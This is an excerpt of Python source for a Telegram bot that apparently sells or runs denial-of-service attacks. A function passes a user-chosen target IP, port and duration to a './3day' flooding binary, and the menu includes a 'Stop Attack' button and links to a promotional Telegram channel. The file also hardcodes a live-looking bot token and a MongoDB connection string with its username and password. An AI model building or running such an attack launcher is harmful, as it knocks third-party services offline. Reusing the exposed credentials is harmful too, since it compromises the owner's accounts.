...
TOKEN = '7870573942:AAHIIAaskhH41feF8YXZ6x-FkvqOOychxg0' #Enter_Bot_Token_within_the_colons
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002256746690   
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./3day {target_ip} {target_port} {duration} 70"
    try:
...
def handle_message(message):
    ...
    if message.text == "Stop Attack 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/ROLEX_GAMENG*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*Heya Master_-_\n\n Join @ROLEX_GAMENG on Telegram*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*My Admins Are*\n\n @ROLEX_GAMENG", parse_mode='Markdown')
    else:
